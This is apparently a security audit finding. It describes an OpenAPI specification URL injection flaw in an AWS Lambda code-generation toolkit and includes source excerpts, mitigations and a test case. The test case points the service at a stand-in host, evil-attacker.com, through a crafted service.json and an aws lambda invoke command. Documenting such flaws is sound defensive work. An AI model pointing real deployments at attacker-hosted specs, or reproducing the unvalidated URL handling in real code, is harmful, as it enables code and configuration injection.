### Vulnerability List

- **Vulnerability Name:** OpenAPI Specification URL Injection
  - **Description:**
    1. An attacker crafts a malicious OpenAPI specification (e.g., hosted on a compromised server).
    2. The attacker creates a `service.json` file, providing the malicious URL in the `service.openapi.model` field.
    3. The attacker invokes the Industry Toolkit's service creation API endpoint, providing the crafted `service.json` as payload.
    4. The toolkit's backend service (`handler.lambda_handler`) processes the request and passes the OpenAPI URL to the `OpenApiCodegen` component.
    5. `OpenApiCodegen` directly uses the provided URL to instruct `openapi-generator-cli` to fetch and process the specification.
    6. If the malicious OpenAPI specification is designed to exploit vulnerabilities in `openapi-generator-cli` or the code generation process, it can lead to code injection, insecure configurations, or other malicious outcomes within the generated service or infrastructure.
  - **Impact:**
    - **Code Injection:** A malicious OpenAPI specification can be crafted to inject arbitrary code into the generated service codebase. This could allow the attacker to execute commands on the server hosting the generated service, potentially gaining full control.
    - **Configuration Injection:** The malicious specification can manipulate the generated infrastructure configurations (e.g., CloudFormation templates), leading to the deployment of insecure or attacker-controlled infrastructure.
    - **Information Disclosure:** Processing a malicious specification might trigger vulnerabilities in the OpenAPI processing tools, potentially leading to the disclosure of sensitive information from the toolkit's environment.
  - **Vulnerability Rank:** High
  - **Currently Implemented Mitigations:** None
  - **Missing Mitigations:**
    - **Input Validation and Sanitization:** Implement strict validation of the OpenAPI specification URL. This could include:
      - **URL Scheme Validation:** Allow only `https` URLs to prevent man-in-the-middle attacks if `http` is used.
      - **Domain Whitelisting:** Restrict allowed domains for OpenAPI specification URLs to a predefined list of trusted sources.
      - **Content Type Validation:** Verify that the content served at the provided URL is indeed a valid OpenAPI specification (e.g., by checking MIME type).
    - **OpenAPI Specification Parsing and Sanitization:** Before passing the OpenAPI specification URL to `openapi-generator-cli`, the toolkit should:
      - Download and parse the OpenAPI specification.
      - Validate the specification against a strict schema to ensure it conforms to expected structure and prevent unexpected or malicious elements.
      - Sanitize the specification to remove any potentially dangerous or unexpected content before using it for code generation.
    - **Sandboxing for Code Generation:** Execute the `openapi-generator-cli` process in a sandboxed environment with restricted permissions. This would limit the potential damage if `openapi-generator-cli` is exploited.
    - **Regular Updates of Dependencies:** Keep `openapi-generator-cli` and other dependencies updated to the latest versions to patch known security vulnerabilities.
  - **Preconditions:**
    - The attacker must have the ability to invoke the Industry Toolkit's service creation API, which is exposed through the API Gateway after deploying the toolkit. This assumes the attacker is an authorized or unauthorized user who can send POST requests to the `/services` endpoint of the Industry Toolkit API.
  - **Source Code Analysis:**
    1. **`/code/toolkit-service-lambda/handler.py` - `process_service_creation` function:**
       - The `process_service_creation` function is the entry point for handling service creation requests. It extracts the service definition from the input payload.
       - It determines the model type (`openapi` or `openapi-gen`) and instantiates the corresponding code generator (`OpenApiCodegen` or `OpenApiGenAiCodegen`).
       - It then calls the `generate_project` method of the chosen code generator, passing the service information.
       ```python
       def process_service_creation(payload):
           ...
           service_info = payload["service"]
           ...
           if "openapi" in service_info:
               codegen = OpenApiCodegen()
           elif "openapi-gen" in service_info:
               codegen = OpenApiGenAiCodegen()
           ...
           codegen.generate_project(project_id, service_info)
           ...
       ```
    2. **`/code/toolkit-service-lambda/codegen/open_api_codegen.py` - `generate_project` function:**
       - The `generate_project` function in `OpenApiCodegen` is responsible for generating the project code using `openapi-generator-cli`.
       - It retrieves the OpenAPI specification URL directly from `service_info["openapi"]["model"]`.
       - Critically, it passes this URL directly as the `-i` parameter to the `openapi-generator-cli generate` command without any validation or sanitization.
       ```python
       class OpenApiCodegen(Codegen):
           def generate_project(self, project_id: str, service_info: str):
               service_type = service_info["type"]
               model_location = service_info["openapi"]["model"] # User-provided URL

               config = service_info["openapi"].get("config", {})

               app_dir = f"/tmp/{project_id}/app"
               os.makedirs(app_dir, exist_ok=True)

               model_dir = f"/tmp/{project_id}/model"
               os.makedirs(model_dir, exist_ok=True)

               model_filename = os.path.basename(model_location)

               command = [
                   "java",
                   "-jar",
                   "/opt/openapi-generator-cli.jar",
                   "generate",
                   "-i", model_location, # VULNERABILITY: Directly using user-provided URL
                   "-g", service_type,
                   "-o", app_dir,
                   "--additional-properties", ",".join(f"{k}={v}" for k, v in config.items())
               ]

               try:
                   subprocess.run(command, check=True, capture_output=True, text=True)
                   print(f"Project generated successfully at {app_dir}")
               except subprocess.CalledProcessError as e:
                   print(f"Failed to generate project: {e}")
                   raise RuntimeError(f"Error running OpenAPI Generator: {e.stderr}")
       ```
       - The `subprocess.run` function then executes the command, potentially processing a malicious OpenAPI specification from the attacker-controlled URL.

  - **Security Test Case:**
    1. **Prerequisites:**
       - Deploy the Industry Toolkit stack.
       - Obtain the API Gateway endpoint URL for invoking the service creation.
       - Set up a publicly accessible malicious OpenAPI specification file (e.g., `malicious-openapi.yaml`) hosted at `https://evil-attacker.com/malicious-openapi.yaml`. This file can contain payloads designed to exploit known vulnerabilities in `openapi-generator-cli` or simply be crafted to inject code into generated outputs. For a basic test, a spec that causes an error during generation is sufficient to verify the URL is being processed.

    2. **Craft Malicious Request:**
       - Create a `service.json` file that includes the URL of the malicious OpenAPI specification:
         ```json
         {
           "service": {
             "type": "spring",
             "name": "test-service-evil-openapi",
             "description": "Test service with malicious OpenAPI URL",
             "openapi": {
               "model": "https://evil-attacker.com/malicious-openapi.yaml",
               "config": {
                 "basePackage": "com.example.test",
                 "artifactId": "test-service-evil-openapi"
               }
             }
           },
           "scm": {
             "github": {
               "repo": "https://github.com/my-org/test-repo",  // Replace with a valid repo URL (can be dummy for test)
               "secretKey": "my-key", // Replace with valid secret key from Secrets Manager
               "email": "test@example.com",
               "name": "Test User"
             }
           },
           "iac": {
             "cloudformation": {
               "vpc": "vpc-xxxxxxxx", // Replace with valid VPC ID
               "subnets": "subnet-xxxxxxx,subnet-xxxxxxx" // Replace with valid subnet IDs
             }
           }
         }
         ```
       - Replace placeholder values (VPC, subnets, GitHub repo, secret key) with valid, but potentially dummy, values for your test environment. The key element is the malicious OpenAPI URL.

    3. **Invoke Service Creation API:**
       - Use `aws lambda invoke` or a similar tool to call the Industry Toolkit's Bootstrapper Lambda function, providing `service.json` as the payload.
         ```bash
         aws lambda invoke \
               --function-name <YourBootstrapperLambdaFunctionName> \
               --payload file://service.json \
               --cli-binary-format raw-in-base64-out \
               /dev/stdout
         ```
         (Replace `<YourBootstrapperLambdaFunctionName>` with the actual name of your Bootstrapper Lambda function from the stack outputs).

    4. **Analyze Results:**
       - **Check CloudWatch Logs:** Examine the CloudWatch logs for the Bootstrapper Lambda function. Look for log entries related to `openapi-generator-cli`. Verify that the command executed includes the malicious OpenAPI URL.
       - **Examine Generated Code (if possible and if the malicious spec is designed to inject code):** If the malicious OpenAPI spec was crafted to inject code, attempt to retrieve the generated project from the specified GitHub repository (if the process completes enough to push to Git). Inspect the generated code for injected malicious content.
       - **Observe for Errors:** Even if a full code injection exploit is not immediately apparent, observe if the `openapi-generator-cli` process throws errors or behaves unexpectedly when processing the malicious specification. This can indicate that the toolkit is indeed attempting to process the external, potentially harmful, specification.

    5. **Expected Outcome:**
       - The test should demonstrate that the Industry Toolkit fetches and attempts to process the OpenAPI specification from the attacker-provided URL. Depending on the nature of the malicious specification and potential vulnerabilities in `openapi-generator-cli`, the impact could range from errors during code generation to successful code or configuration injection. At a minimum, observing the toolkit attempting to process the external URL confirms the vulnerability exists.
